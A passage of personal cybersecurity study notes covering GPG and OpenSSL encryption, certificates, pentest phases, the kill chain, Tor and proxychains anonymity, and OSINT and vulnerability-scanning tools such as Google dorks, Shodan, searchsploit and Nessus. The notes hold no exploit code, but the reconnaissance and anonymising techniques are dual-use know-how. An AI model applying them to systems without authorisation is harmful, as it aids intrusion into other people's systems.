generated](media/image57.png){width="6.5in"
height="1.4756944444444444in"}

**Decrypt a file with a password**

aescrypt -d -p \<password\> \<file\>

![Text Description automatically
generated](media/image58.png){width="6.5in"
height="1.8569444444444445in"}

##### Using Powershell

![Graphical user interface, text, application, email Description
automatically generated](media/image59.png){width="6.5in"
height="4.281944444444444in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image60.png){width="6.5in"
height="3.748611111111111in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image61.png){width="6.5in"
height="8.050694444444444in"}

From this point onwards the password or the secret can be used in the
script that's required to have it.

![Graphical user interface, text, application, email Description
automatically generated](media/image62.png){width="6.5in"
height="4.2243055555555555in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image63.png){width="6.5in"
height="3.4381944444444446in"}

![Graphical user interface, text, application Description automatically
generated](media/image64.png){width="6.5in"
height="2.3256944444444443in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image65.png){width="6.5in"
height="4.528472222222222in"}

### Encrypting with PGP \[Asymmetric\]

PGP is an a type of asymmetric encryption which uses symmetric
encryption to encrypt the private key by default (which can be done in
other encryption offerings -- like RSA, but no by default).

Using GUI:

-   **Windows application** (gpg4win) : <https://www.gpg4win.org>

-   **Windows application and linux GUI (gua):**
    <https://www.youtube.com/watch?v=CEADq-B8KtI>

**Important directory:** \~/.gnupg

![Text Description automatically
generated](media/image66.png){width="6.5in"
height="2.1902777777777778in"}

#### Using default keys

Steps

gpg -c secret.txt

*\^ creates secret.txt.gpg*

gpg -d secret.txt.gpg

"c" : encrypt (password prompt"

"d" : decrypt

![Text Description automatically
generated](media/image67.png){width="4.125212160979878in"
height="2.791809930008749in"}

Note: password won't prompt to decrypt if on same machine that was used
to encrypt.

#### Using custom keys

#### Creating keys and initial configuration

Before creating keys, it's a good idea to install a program to generate
system entropy

sudo apt install rng-tools -y

sudo rngd -r /dev/urandom

**Keyring**: a sort of key manager which holds keys you intend to use.
Much like ssh-agent.

1.  Install pgp

    a.  sudo apt-get install gap gnupg2 -y

    b.  Alternatively, you can additionally install gpa as well. Running
        'gpa' will activate the linux gui for managing keys, encryption,
        and decryption.

        i.  ![](media/image68.png){width="4.2258606736657915in"
            height="0.23747922134733157in"}

2.  Generate a key

    a.  gpg \--full-generate-key or... gpg --gen-key

    b.  Next, you will need to create an ID for people to identify your
        key. The user ID will be generated from your real name, email
        address and comment. Press "O" to confirm your choices

    c.  Now create a password for your secret or public key

    d.  Once you've done this, you can generate the public key. Type
        something on your keyboard or move your mouse around to create
        entropy for the random number generator

3.  List public keys:

    a.  list keys: sudo gpg \--list-keys or sudo gpg --list-public-keys

    b.  By name:sudo gpg \--list-keys \[name\]

        i.  ![](media/image69.png){width="5.608871391076115in"
            height="0.6633562992125984in"}

        ii. "sub": This is the private key.

4.  Export public key to a file

    a.  gpg \--output myfile \--export \[key name\]

    b.  gpg \--output publickey.txt \--export
        052E036B88E8876E9EDBF25BD956195BEAE573E1

5.  Export private key to a file

    a.  gpg \--output privatekey --export-secret-key \[key name\]

    b.  gpg \--output privatekey --export-secret-key
        052E036B88E8876E9EDBF25BD956195BEAE573E1

Note: critical information is store in the \~/.gnupg directory:

![Text Description automatically
generated](media/image70.png){width="6.5in" height="1.3in"}

#### Uploading/Importing keys to/from ubuntu key server

**Uploading**

List keys and take note of public key ID

![Text Description automatically
generated](media/image71.png){width="6.5in"
height="1.3145833333333334in"}

Then, send your public key to ubunt key server with...

gpg --send-keys --keyserver khp://keyserver.ubuntu.com \<PUB_KEY_ID\>

![](media/image72.png){width="6.5in" height="0.3729166666666667in"}

**Importing/Receiving keys**

gpg --keyserver hkp://keyserver.ubuntu.com --recv-key \<PUB_KEY_ID\>

![](media/image73.png){width="6.5in" height="0.7763888888888889in"}

Run list keys again to see the key imported

![Text Description automatically
generated](media/image74.png){width="6.5in"
height="2.061111111111111in"}

You can subsequently sign items with the public key so that only the key
owner can unecrypt it with their private key.

You can specify the recipient key (public key) by name for key id

![Text Description automatically
generated](media/image75.png){width="6.5in"
height="3.859027777777778in"}

#### Encrypting a file

*As a sender, you must encrypt a message using the public key of the
intended recipient.*

1.  Download/copy your friend's public key into a file

    a.  scp ssh droplet01:./keys/friend_publickey .

2.  Import your friend's public key into the keyring

    a.  gpg \--import friend_publickey

        i.  ![](media/image76.png){width="5.8085793963254595in"
            height="0.5622408136482939in"}

    b.  Now when you list your keys you should see your friend's public
        key

        i.  ![Text Description automatically
            generated](media/image77.png){width="5.118912948381452in"
            height="0.8755741469816273in"}

    c.  You can list this key individual by name as well

        i.  ![Text Description automatically
            generated](media/image78.png){width="6.5in"
            height="0.8409722222222222in"}

    d.  Note: Your private key should still be under your secret keys:

        i.  ![Text Description automatically
            generated](media/image79.png){width="5.590774278215223in"
            height="0.9694258530183727in"}

3.  Import your private key

    a.  *Note: Importing your private key into the gpg manager allows
        you to decrypt received messages.*

    b.  sudo gpg \--import privatekey

    c.  ![Text Description automatically
        generated](media/image80.png){width="6.5in"
        height="1.3243055555555556in"}

4.  Save your message into a file and encrypt your message...

    a.  using the 'recipient' flag to pass in the name of the public key
        belonging to the intended recipient

    b.  and using the 'encrypt' flag to pass in the file you wish to
        encrypt

    c.  ![Text Description automatically
        generated](media/image81.png){width="6.0826060804899384in"
        height="2.0977198162729658in"}

5.  Send the file to the recipient (using scp in this example)

    a.  scp mymessage.txt.gpg ssh droplet01:./cypher/

#### Decrypting a file

As the intended recipient you must use your private key to decrypt the
file.

1.  Make sure you import your private key into the key ring. List the
    keys to make sure you have a key that macthes the name of the key
    used to encrypt the file. Note how I used the 'Droplet01' key in
    both cases.

    a.  ![Text Description automatically
        generated](media/image82.png){width="5.600255905511811in"
        height="1.6764873140857393in"}

2.  Use decrypt flag and reference the file you wish to decrypt

    a.  gpg \--decrypt mymessage.txt.gpg

3.  Enter the password for your privatekey

    a.  ![Text Description automatically
        generated](media/image83.png){width="4.2793361767279094in"
        height="1.4328455818022747in"}

4.  Voila

    a.  ![](media/image84.png){width="4.805330271216098in"
        height="0.5303324584426946in"}

5.  You can also decrypt the message into a file using the 'output' flag

    a.  gpg \--output plaintextmsg \--decrypt mymessage.txt.gpg

6.  One can also include the password as an argument

    a.  gpg \--passphrase \'/\^!01101001\_\$/gi\' \--decrypt
        mymessage.txt.gpg

    b.  ![](media/image85.png){width="6.5in"
        height="0.5513888888888889in"}

    c.  \^ Useful if you are automating decrypting Ideally you would
        have a way to encrypt/decrypt your password (say using AES) and
        this value is decrypted after being pulled from a database or
        via a user portal for example.

## Digital Signature: Signing with Hash with a private key 

Great demo: <https://www.youtube.com/watch?v=ANMxXCoLm9w>

As we know, encrypting something with someone's **public key** makes
sure that only the person with the private key can decrypt that item.

However, the inverse (**encrypting something with your [private
key]{.underline}**) is called signing and this ensures that anyone with
your public key can decrypt that item. Signing is used for authenticity.

For example, a trusted entity can give out their public key. To prove
that someone is indeed that same trusted entity they must have the
associated private key which belongs to that public/private key pair.
However, they can't just share their private key. But what they could do
is encrypt something with that private key. This process is called
signing and anybody with the proper public key would be able to decrypt
that msg and this would be enough to prove the authenticity of the
entity in question.

### Creating signature and verifying it with openssl

Now, you\'ll create a hash digest of the message, then create a digital
signature of this digest. Once that\'s done, you\'ll verify the
signature of the digest. This allows you to ensure that your message
wasn\'t modified or forged. If the message was modified, the hash would
be different from the signed one, and the verification would fail.

To create a hash digest of the message, enter this command:

openssl dgst -sha256 -sign private_key.pem -out secret.txt.sha256
secret.txt

Copied!

content_copy

This creates a file called \"secret.txt.sha256\" using your private key,
which contains the hash digest of your secret text file.

With this file, anyone can use your public key and the hash digest to
verify that the file hasn\'t been modified since you created and hashed
it. To perform this verification, enter this command:

openssl dgst -sha256 -verify public_key.pem -signature secret.txt.sha256
secret.txt

Copied!

content_copy

This should show the following output, indicating that the verification
was successful and the file hasn\'t been modified by a malicious third
party:

Verified OK

If any other output was shown, it would indicate that the contents of
the file had been changed, and it\'s likely no longer safe.

## Digital Certificate Management

### Creating Certificates Using OpenSSL

**Create an RSA Self-Signed Certificate Using OpenSSL**

Now that we have a private key, we can use it to generate a self-signed
certificate. This is not required, but it allows us to use the key for
server/client authentication, or gain X509 specific functionality in
technologies

The 'req' switch means we are creating a CSR (r = request)

#### Creating the Certificate Signing Request (CSR)

##### If we already have a key...

![](media/image86.png){width="5.811321084864392in"
height="0.34942366579177603in"}

\^ here our referenced key is "tutorial..."

##### If we don't already have a key... 

This creates a key and creates a CSR in one go.

###### Using RSA

You can create a key from scratch ([see bookmark
here](#using-openssl-openssl)) or create on one the fly as done below.

<https://www.youtube.com/watch?v=ZAE9p1_N6_Q>

Open a terminal and browse to a folder where you would like to generate
your keypair.

To generate a **4096-bit** CSR you can replace the rsa:**2048** syntax
with rsa:**4096** as shown below.

![](media/image87.png){width="6.5in" height="0.2611111111111111in"}
![](media/image88.png){width="6.5in" height="0.3375in"}

-   keyout : where to save private key

-   out : where to save csr

![Text Description automatically
generated](media/image89.png){width="6.5in"
height="3.7805555555555554in"}

\^ FQDN must be the host you wish to protect with this certificate.

###### Using ECDSA (Eliptic curve)

(uses parameter file instead of private key). Uses elliptical curve
algorithm.

First create a parameter file:

![](media/image90.png){width="6.5in" height="0.28402777777777777in"}

Then create csr and reference your parameter file:

![](media/image91.png){width="6.5in" height="0.5368055555555555in"}

Enter info as before:

![Text Description automatically
generated](media/image89.png){width="6.5in"
height="3.7805555555555554in"}

\^ FQDN must be the host you wish to protect with this certificate.

One liner

![](media/image92.png){width="6.5in" height="0.4263888888888889in"}

*Note: You will be prompted to enter a password in order to proceed.
Keep this password as you will need it to use the Certificate.*

##### Verifying a csr

![](media/image93.png){width="6.5in" height="0.27708333333333335in"}

#### Creating the Certificate (CRT)

##### Self-signed

<https://docs.microsoft.com/en-us/azure/iot-hub/tutorial-x509-self-sign>

A **self-signed certificate** is owned by the by same entity that signs
it, therefore the system is required to trust the entity directly in
order to verify the certificate's authenticity. A certificate authority
(CA) is a server that issues digital certificates for entities and
maintains the associated private/public key pair. Certificate
authorities act as a trusted third-party by signing digital certificates
for entities. This allows clients to validate the authenticity of
certificates for entities through the certificate authority. A
certificate signing request (CSR) is a message sent to a certificate
authority (CA) so that an entity can apply for a certificate. A
certificate signing request typically includes information that should
is entered into the entity\'s certificate, such as its public key,
digital signature, and other identifying information

![](media/image94.png){width="6.5in" height="0.5798611111111112in"}

\^ the argument for the "signkey" must be a private key (your own if
self-signed or the key of a CA)

**Create self-signed cert and generate csr with existing key in one
line:**

openssl req -new -x509 -key private-key.pem -out cert.pem -days 360

\^ here we reference our key named "private-key.pem". Notice we also set
1yr for the key to expire. We also specified the x509 standard.

![](media/image95.png){width="6.5in" height="0.7194444444444444in"}

![](media/image96.png){width="2.303653762029746in"
height="0.21904418197725284in"}

##### CA Signed

![Graphical user interface, text, application, email Description
automatically generated](media/image97.png){width="6.5in"
height="1.0541666666666667in"}

Signed with two things:

-   CA : Certificate provided by CA

-   CAkey : CA key (private key)

Upon finishing the CSR Generation process, CA will provide the customer
a private key in a cryptographic form. The next thing to do is to store
both the CSR and private key at a safe location on the server or on a
local drive.

In the case of domain validation (DV), the CA only needs to verify the
domain ownership. Once the customer demonstrates it, the certificate is
issued immediately. Whereas in the case of OV and EV certificates, the
verification process may take up to 10 days as the authority need to
verify all the business-related documents. If the documents provided by
the customer meet the requirement of CA, the certificate will be issued.

### Troubleshooting (s_client command)

OpenSSL provides SSL connectivity between clients and servers. SSL
relies on certificates generated as part of the Public Key
Infrastructure (PKI) design. When there are issues connecting to
webservers using SSL or TLS, the openssl **s_client command** can be
used to gather information about the server\'s certificate and aid in
troubleshooting the issue. 

### Assigning SSL cert on apache

![Text Description automatically
generated](media/image98.png){width="6.5in"
height="2.5590277777777777in"}

![Text Description automatically
generated](media/image99.png){width="6.5in"
height="1.1736111111111112in"}

# Red team: Understanding threats and attacks

## Phases/Steps to Penetration Testing

### PenTest stages

There are 7 stages/phases of penetration testing which include:

1.  **Information Gathering** -- The organization being tested provides
    the penetration tester with general information like scope of
    testing.

2.  **Reconnaissance** -collect additional details from publicly
    accessible sources, penetration testers can identify additional
    information that may have been overlooked, unknown, or not provided.

3.  **Discovery and Scanning** -- Information gathered from the first 2
    steps in then used to determine things like ports and services that
    were available for targeted hosts, or subdomains, available for web
    applications.

4.  **Vulnerability Assessment** -gain initial knowledge and identify
    any potential security weaknesses that could allow an outside
    attacker to gain access to the environment or technology being
    tested.

5.  **Exploitation** -After reviewing the results from the vulnerability
    assessment, the expert penetration testers will use manual
    techniques, human intuition, and their backgrounds to validate,
    attack, and exploit those vulnerabilities.

6.  **Final Analysis and Review** -- This is usually a report that tells
    the client their systems' weaknesses and give them suggestions to
    resolve those weaknesses.

7.  **Utilize the Testing Results** -organization being tested must
    actually use the findings from the security testing to risk rank
    vulnerabilities, analyze the potential impact of vulnerabilities
    found, determine remediation strategies, and inform decision-making
    moving forward.

![Table Description automatically
generated](media/image100.png){width="6.5in"
height="6.1506944444444445in"}

### Cyber Kill Chain

Breaking into a target network usually includes a number of steps.
According to [Lockheed
Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html),
the Cyber Kill Chain has seven steps:

1.  Recon: Recon, short for reconnaissance, refers to the step where the
    attacker tries to learn as much as possible about the target.
    Information such as the types of servers, operating system, IP
    addresses, names of users, and email addresses, can help the
    attack's success.

2.  Weaponization: This step refers to preparing a file with a malicious
    component, for example, to provide the attacker with remote access.

3.  Delivery: Delivery means delivering the "weaponized" file to the
    target via any feasible method, such as email or USB flash memory.

4.  Exploitation: When the user opens the malicious file, their system
    executes the malicious component.

5.  Installation: The previous step should install the malware on the
    target system.

6.  Command & Control (C2): The successful installation of the malware
    provides the attacker with a command and control ability over the
    target system.

7.  Actions on Objectives: After gaining control over one target system,
    the attacker has achieved their objectives. One example objective is
    Data Exfiltration (stealing target's data).

## Scope and Planning

### Determine Targets

Physical, users, wifi, apps, etc.

### Legal Contracts and concepts

-   **Statement of Work (SOW):** Scope, Constraints, Contracts, Limits
    (General).

-   **Master Service Agreement (MSA):** Slimmed down version of SOW from
    a broader view.

-   **Non-Discolsure Agreement (NDA):** Defines what can't be shared
    (between both parties).

### Technical Constraints (Limits)

Define which actions you are/are not allowed to perform on whom/what.

Also be mindful of 3^rd^-party resources which may require 3^rd^-party
consent as well.

### Assessment types

![A picture containing text Description automatically
generated](media/image101.png){width="6.5in"
height="3.727777777777778in"}

![A picture containing text, blackboard Description automatically
generated](media/image102.png){width="6.5in"
height="3.682638888888889in"}

![A picture containing text, blackboard Description automatically
generated](media/image103.png){width="6.5in"
height="3.5840277777777776in"}

### Phases -- Forensics

The chain of custody is used to document the collection and preservation
of evidence from its initial acquisition, throughout the handling
leading up to a trial, and during its preservation in case of an appeal
or retrial.

### Rules of Engagement (ROE)

Important questions: Who, what, where, when ... in relation to testing.

#### What

![A screenshot of a video game Description automatically generated with
medium confidence](media/image104.png){width="6.5in"
height="3.6680555555555556in"}

#### Where

![A picture containing text, blackboard Description automatically
generated](media/image105.png){width="6.5in"
height="3.723611111111111in"}

#### When

![Diagram Description automatically generated with medium
confidence](media/image106.png){width="6.5in"
height="3.4291666666666667in"}

#### Who

![A picture containing text, blackboard Description automatically
generated](media/image107.png){width="6.5in"
height="3.6493055555555554in"}

#### How

![A blackboard with writing on it Description automatically generated
with medium confidence](media/image108.png){width="6.5in"
height="3.5381944444444446in"}

##### Penetration testing strategies

There are three common penetration testing strategies: 

-   **Open-box testing** is when the tester has the same privileged
    access that an internal developer would have---information like
    system architecture, data flow, and network diagrams. This strategy
    goes by several different names, including internal, full knowledge,
    white-box, and clear-box penetration testing.

-   **Closed-box testing** is when the tester has little to no access to
    internal systems---similar to a malicious hacker. This strategy is
    sometimes referred to as external, black-box, or zero knowledge
    penetration testing.

-   **Partial knowledge testing** is when the tester has limited access
    and knowledge of an internal system---for example, a customer
    service representative. This strategy is also known as gray-box
    testing.

Closed box testers tend to produce the most accurate simulations of a
real-world attack. Nevertheless, each strategy produces valuable results
by demonstrating how an attacker might infiltrate a system and what
information they could access.

### Support Resources

#### Policies

Ask what policies are currently in place (VPN, password rotation, etc).

#### Soap vs REST

![A picture containing text, blackboard Description automatically
generated](media/image109.png){width="6.5in"
height="3.6493055555555554in"}

![A picture containing text, blackboard Description automatically
generated](media/image110.png){width="6.5in"
height="3.7444444444444445in"}

![A picture containing text, blackboard Description automatically
generated](media/image111.png){width="6.5in"
height="3.386111111111111in"}

![A picture containing text, blackboard Description automatically
generated](media/image112.png){width="6.5in"
height="3.6416666666666666in"}

#### Sample application request

![A blackboard with writing on it Description automatically generated
with medium confidence](media/image113.png){width="6.5in"
height="2.9694444444444446in"}

## Privacy and remaining anonymmous

### ­Tor

If you try to run proxychains before installing tor, you will get an
error since tor isn't installed and it's being used as the default
proxy.

***E: Package \'tor\' has no installation candidate***

**Install**

![](media/image114.png){width="5.979166666666667in"
height="0.3854166666666667in"}

![](media/image115.png){width="6.5in" height="0.5243055555555556in"}

**Start**

![Text Description automatically
generated](media/image116.png){width="6.5in"
height="1.0604166666666666in"}

**Verify (check listening TCP connections)**

![](media/image117.png){width="6.5in" height="0.34930555555555554in"}

**Additionally you can install the tor browser:**

sudo apt install torbrowser-launcher

**Verify browser connection is using tor network**

In address bar enter: **check.torproject.org**

### ProxyChains

**Install**

![](media/image118.png){width="6.5in" height="0.4979166666666667in"}

**Config**

![](media/image119.png){width="6.5in" height="0.64375in"}

**Start**

#### Overview and Configuration

![](media/image120.png){width="6.5in" height="0.49027777777777776in"}

![Diagram, text Description automatically
generated](media/image121.png){width="6.5in"
height="7.816666666666666in"}

![A page of a book Description automatically generated with medium
confidence](media/image122.png){width="6.135416666666667in"
height="8.71875in"}

![A piece of paper with writing Description automatically generated with
medium confidence](media/image123.png){width="6.5in" height="3.275in"}

![Text, letter Description automatically
generated](media/image124.png){width="6.5in"
height="4.488194444444445in"}

![Text, letter Description automatically
generated](media/image125.png){width="6.5in" height="5.8125in"}

![Text, letter Description automatically
generated](media/image126.png){width="6.5in" height="3.35625in"}

Make sure *"Proxy DNS requests"* is also uncommented as well.

![A screenshot of a computer Description automatically generated with
medium confidence](media/image127.png){width="6.5in"
height="0.8395833333333333in"}

![Text Description automatically
generated](media/image128.png){width="5.677083333333333in"
height="2.8229166666666665in"}

#### Using proxychains

Pass in the service you want proxyxchains to be applied on (SSH, telnet,
firefox, etc).

proxychains firefox www.google.com

## Information Gathering

### Passive (OSINT)

Some examples include:

-   Social media queries

-   WHOIS searches

-   Dumpster diving

![Text Description automatically
generated](media/image129.png){width="6.5in" height="1.79375in"}

![Graphical user interface, text, application Description automatically
generated](media/image130.png){width="6.5in"
height="3.609027777777778in"}

#### All-in-one OSINT Tools

##### Google dorks (google dorking)

<https://www.youtube.com/watch?v=Jsg9JOyoeg0>

<https://www.youtube.com/watch?v=u_gOnwWEXiA>

Here could see an example to understand how **Google
Darks** **password **used by hackers to gain sensitive information from
specific websites.

-   "**inurl: domain/**" "**additional dorks**

A hacker would simply use in the desired parameters as follows:

-   **inurl = the URL of a site you want to query**

-   **domain = the domain for the site**

-   **dorks = the sub-fields and parameters that a hacker wants to
    scan**

The best way to use **Google dorks** legally is to find
vulnerabilities **on your own website**.

We can also use other search filed
than [URL ](https://gbhackers.com/how-to-check-if-a-website-is-malicious/)that
will help to uncover a lot of information about a site.

**intitle:**\
**inurl:**\
**intext:**\
**define:**\
**site:**\
**phonebook:**\
**maps:**\
**book:**\
**info:**\
**movie:**\
**weather:**\
**related:**\
**link:**

##### Maltego (search anything and everything) \[POWERFUL\]

Comes in kali.

<https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/5942262#overview>

<https://www.youtube.com/watch?v=zemNLx0-LRw>

![Graphical user interface, text Description automatically
generated](media/image131.png){width="6.5in" height="1.60625in"}

##### Shodan search engine

Search engine that searches the internet's IoT information. Basically a
large scan of banner grabs.

**CrashCourse:** <https://www.youtube.com/watch?v=v2EdwgX72PQ>

**Cheat Sheet:**
<https://cheatography.com/sir-slammington/cheat-sheets/shodan/>

**Cheat Sheet:** <https://www.youtube.com/watch?v=5Ko6GUqY2m0>

![](media/image132.png){width="6.5in" height="0.5465277777777777in"}

![A picture containing text, receipt Description automatically
generated](media/image133.png){width="6.5in"
height="3.4027777777777777in"}

###### Basic Search Filters

**port:** Search by specific port\
**net:** Search based on an IP/CIDR\
**hostname:** Locate devices by hostname\
**os:** Search by Operating System\
**city:** Locate devices by city\
**country:** Locate devices by country\
**geo:** Locate devices by coordinates\
**org:** Search by organization\
**before/after:** Timeframe delimiter\
**hash:** Search based on banner hash\
**has_screenshot:true** Filter search based on a screenshot being
present\
**title:** Search based on text within the title

#### Geographic scanning

##### Wardriving/Warflying 

![Graphical user interface, text, application Description automatically
generated](media/image134.png){width="6.5in" height="3.25in"}

#### Web app tech stack + site information

##### Whatweb (tech stack)

<https://www.kali.org/tools/whatweb/>

![Text Description automatically
generated](media/image135.png){width="6.5in"
height="1.4520833333333334in"}

##### Netcraft (search by url -- see tech info)

<https://sitereport.netcraft.com/>

![Graphical user interface, application, table Description automatically
generated](media/image136.png){width="6.5in"
height="2.3583333333333334in"}

##### Whois

![Text Description automatically
generated](media/image137.png){width="6.5in"
height="3.3916666666666666in"}

Also, can be used directly on an IP to get info about the IP and who
owns it.

#### DNS Information

##### Robtext (Get DNS information)

Used to grab dns and nameserver information.

![Graphical user interface, text, application, email Description
automatically generated](media/image138.png){width="6.5in"
height="3.240972222222222in"}

##### Reverse DNS lookup

**Reverse DNS lookup** -- looking up an ip to see which hostnames it
resolves to. Could be more than one...

![Text Description automatically
generated](media/image139.png){width="6.5in"
height="2.0277777777777777in"}

![Chart Description automatically generated with low
confidence](media/image140.png){width="6.021673228346457in"
height="0.9167946194225722in"}

#### Vulnerability scanning

##### Haveibeenpwned

<https://haveibeenpwned.com/>

#### Subdomain Enumeration 

##### \[OSINT\] Google Dorking

**-site:www.tryhackme.com  site:\*.tryhackme.com**

##### \[OSINT\] SSL/TLS Certificates

**SSL/TLS Certificates**

When an SSL/TLS (Secure Sockets Layer/Transport Layer Security)
certificate is created for a domain by a CA (Certificate Authority),
CA\'s take part in what\'s called \"Certificate Transparency (CT)
logs\". These are publicly accessible logs of every SSL/TLS certificate
created for a domain name. The purpose of Certificate Transparency logs
is to stop malicious and accidentally made certificates from being used.
We can use this service to our advantage to discover subdomains
belonging to a domain, sites like <https://crt.sh> and
<https://ui.ctsearch.entrust.com/ui/ctsearchui> offer a searchable
database of certificates that shows current and historical results.

##### \[OSINT\] Subdomain search (knockpy)

Knowing any subdomains increases the size of the attack surface.

![](media/image141.png){width="5.75080271216098in"
height="0.6980139982502187in"}

##### \[OSINT\] Sublist3r

To speed up the process of OSINT subdomain discovery, we can automate
the above methods with the help of tools
like [Sublist3r](https://github.com/aboul3la/Sublist3r).

![Text Description automatically
generated](media/image142.png){width="6.5in"
height="1.0965277777777778in"}

![Text Description automatically
generated](media/image143.png){width="6.5in"
height="3.5819444444444444in"}

##### \[OSINT\] DNS Zone Transfer

![A page of a book Description automatically generated with medium
confidence](media/image144.png){width="6.5in"
height="6.009722222222222in"}

### Active

Some examples include:

-   DNS Queries

-   Network scanning

.

#### The Wayback machine

The Wayback Machine (<https://archive.org/web/>) is a historical archive
of websites that dates back to the late 90s. You can search a domain
name, and it will show you all the times the service scraped the web
page and saved the contents. This service can help uncover old pages
that may still be active on the current website.

#### Exploit database (exploitdb)

Find know exploitable vulnerabilities per given system type/specs:

<https://www.exploit-db.com/>

##### Searchsploit

[**https://www.youtube.com/watch?v=29GlfaH5qCM**](https://www.youtube.com/watch?v=29GlfaH5qCM)

Much like the locate command -- a copy of the exploit db is saved
locally and referenced.

**Updating searchsploit**

![Graphical user interface, text Description automatically
generated](media/image145.png){width="3.55257874015748in"
height="1.083484251968504in"}

You can also search for CVE vulnerabilities in exploit-db using the
searchspoit utility in the command line (standard in kali)

<https://medium.com/@heynik/how-to-search-the-exploit-by-terminal-using-searchsploit-in-kali-linux-7a90193b3ddf>

**Standard Search**

![Text Description automatically
generated](media/image146.png){width="6.5in"
height="2.2041666666666666in"}

![Graphical user interface Description automatically
generated](media/image147.png){width="6.5in"
height="1.6506944444444445in"}

**Search by title**

![](media/image148.png){width="4.990279965004374in"
height="0.5209055118110236in"}

**Copying a vulnerable file locally for investigation**

![Text Description automatically
generated](media/image149.png){width="6.5in"
height="2.313888888888889in"}

#### Certificate and SSL/TLS Scanning

##### Sslscan

<https://www.kali.org/tools/sslscan/>

<https://www.youtube.com/watch?v=DDbwrMrwOFc>

SSLScan queries SSL services, such as HTTPS, in order to determine the
ciphers that are supported. SSLScan is designed to be easy, lean and
fast. The output includes preferred ciphers of the SSL service, the
certificate and is in text and XML formats.

**Note**: You don't need to specify the protocol -- just the domain at
least.

![](media/image150.png){width="3.949992344706912in"
height="0.3514501312335958in"}

![Text Description automatically
generated](media/image151.png){width="6.5in" height="4.4875in"}

**Check which SSL/TLS protocols are enabled/disabled**

![Diagram Description automatically generated with low
confidence](media/image152.png){width="3.958885608048994in"
height="2.5107666229221346in"}

**Check SSL Cert key-bit and algorithm**

![A picture containing text Description automatically
generated](media/image153.png){width="5.14665135608049in"
height="0.9803937007874016in"}

#### Bandwidth monitoring tools

![Text Description automatically
generated](media/image154.png){width="4.8127471566054245in"
height="4.472451881014873in"}

##### Cuckoo (sandbox tool)

![](media/image155.png){width="6.5in" height="0.7958333333333333in"}

#### Vulnerability Scanning

##### What is a vulnerability scanner?

A **vulnerability scanner** is software that automatically compares
known vulnerabilities and exposures against the technologies on the
network. In general, these tools scan systems to find misconfigurations
or programming flaws.

Scanning tools are used to analyze each of the five attack surfaces that
you learned about in [the video about the defense in depth
strategy](https://www.coursera.org/learn/assets-threats-and-vulnerabilities/lecture/IdvXj/defense-in-depth-strategy):

1.  **Perimeter layer**, like authentication systems that validate user
    access

2.  **Network layer**, which is made up of technologies like network
    firewalls and others

3.  **Endpoint layer**, which describes devices on a network, like
    laptops, desktops, or servers

4.  **Application layer**, which involves the software that users
    interact with

5.  **Data layer**, which includes any information that's stored, in
    transit, or in use

When a scan of any layer begins, the scanning tool compares the findings
against databases of security threats. At the end of the scan, the tool
flags any vulnerabilities that it finds and adds them to its reference
database. Each scan adds more information to the database, helping the
tool be more accurate in its analysis.

**Note:** Vulnerability databases are also routinely updated by the
company that designed the scanning software.

##### Performing scans

Vulnerability scanners are meant to be non-intrusive. Meaning, they
don't break or take advantage of a system like an attacker would.
Instead, they simply scan a surface and alert you to any potentially
unlocked doors in your systems.

**Note:** While vulnerability scanners are non-intrusive, there are
instances when a scan can inadvertently cause issues, like crash a
system.

There are a few different ways that these tools are used to scan a
surface. Each approach corresponds to the pathway a threat actor might
take. Next, you can explore each type of scan to get a clearer picture
of this. 

**External vs. internal**

External and internal scans simulate an attacker\'s approach.

*External scans* test the perimeter layer outside of the internal
network. They analyze outward facing systems, like websites and
firewalls. These kinds of scans can uncover vulnerable things like
vulnerable network ports or servers.

*Internal scans* start from the opposite end by examining an
organization\'s internal systems. For example, this type of scan might
analyze application software for weaknesses in how it handles user
input.

##### Authenticated vs. unauthenticated

Authenticated and unauthenticated scans simulate whether or not a user
has access to a system.

*Authenticated scans* might test a system by logging in with a real user
account or even with an admin account. These service accounts are used
to check for vulnerabilities, like broken access controls.

*Unauthenticated scans* simulate external threat actors that do not have
access to your business resources. For example, a scan might analyze
file shares within the organization that are used to house internal-only
documents. Unauthenticated users should receive \"access denied\"
results if they tried opening these files. However, a vulnerability
would be identified if you were able to access a file.

##### Limited vs. comprehensive

Limited and comprehensive scans focus on particular devices that are
accessed by internal and external users.

*Limited scans* analyze particular devices on a network, like searching
for misconfigurations on a firewall.

*Comprehensive scans* analyze all devices connected to a network. This
includes operating systems, user databases, and more.

**Pro tip:** Discovery scanning should be done prior to limited or
comprehensive scans. Discovery scanning is used to get an idea of the
computers, devices, and open ports that are on a network.

##### Scanning Tools

###### Nexpose Vulnerability Scanner (from Metasploit)

![Graphical user interface, website Description automatically
generated](media/image156.png){width="6.5in"
height="2.2604166666666665in"}

###### Nessus Vulnerability scanner

<https://www.udemy.com/course/complete-ethical-hacking-bootcamp-zero-to-mastery/learn/lecture/22279666#overview>

This is a commercial solution -- but there are opensource alternatives
like OpenVAS and Metasploit's "Nexpose" scanning module. Checking
again... OpenVAS may not be free anymore...

![Text Description automatically
generated](media/image157.png){width="6.5in"
height="1.0909722222222222in"}

<https://www.tenable.com/products/nessus>

**Install, Enable, start**

sudo dpkg -i Nessus-\<version_num\>-debian6_amd64.deb

sudo systemctl enable nessusd

sudo systemctl enable nessusd

**WebUI**: localhost:8834

In order to scan you must have a policy set. Policies are just a
configuration defining what is to be scanned and which vulnerabilities.
Then, you can choose a policy (type of scan) and run that scan on an
immediate or scheduled basis.

![Graphical user interface, application Description automatically
generated](media/image158.png){width="6.5in"
height="2.296527777777778in"}

You can define your targets too

![A picture containing chart Description automatically
generated](media/image159.png){width="5.28499343832021in"
height="1.0694991251093613in"}

###### nikto (outdated software scanner)

A fairly fast command.

![Text Description automatically generated with medium
confidence](media/image160.png){width="4.794647856517935in"
height="0.8170363079615048in"}

###### sn1per (utility)

![Text Description automatically
generated](media/image161.png){width="6.5in"
height="1.1652777777777779in"}

###### \[ALL-IN-ONE\] Discover Scanner

<https://github.com/leebaird/discover>

Not really a program -- but a collection of scripts that are run.

![Text Description automatically
generated](media/image162.png){width="6.5in"
height="1.695138888888889in"}

Commands in text:

sudo su -

git clone <https://github.com/leebaird/discover> /opt/discover/

cd /opt/discover/

sudo ./discover.sh

![Text Description automatically
generated](media/image163.png){width="5.532022090988627in"
height="5.573694225721785in"}

**Usage:**

